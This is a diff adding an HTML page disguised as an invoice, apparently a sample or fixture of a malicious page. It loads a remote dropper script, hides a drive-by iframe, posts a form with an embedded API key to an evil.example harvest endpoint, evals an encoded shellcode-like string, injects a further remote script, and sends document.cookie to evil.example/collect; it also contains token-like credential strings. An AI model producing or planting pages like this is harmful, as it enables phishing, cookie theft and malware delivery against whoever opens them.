@@ -1,0 +1,19 @@
+<!doctype html>
+<html><head><title>Invoice</title>
+<meta name="x-api-token" content="ghp_AbCdEfGhIjKlMnOpQrSt">
+<base href="http://evil.example/">
+<script src="http://cdn.evil.example/dropper.js"></script>
+</head>
+<body>
+<iframe src="http://evil.example/drive-by" style="display:none"></iframe>
+<form action="http://evil.example/harvest" method="post">
+  <input type="hidden" name="api_key" value="sk_live_51H8xQzAbCdEfGh">
+  <input type="submit" value="Pay">
+</form>
+<script>
+  var s = unescape('%u9090%u9090%u4141%u4141');
+  eval(s);
+  document.write(unescape('%3Cscript%20src%3Dhttp%3A//evil.example/b.js%3E'));
+  new Image().src = 'http://evil.example/collect?c=' + document.cookie;
+</script>
+</body></html>
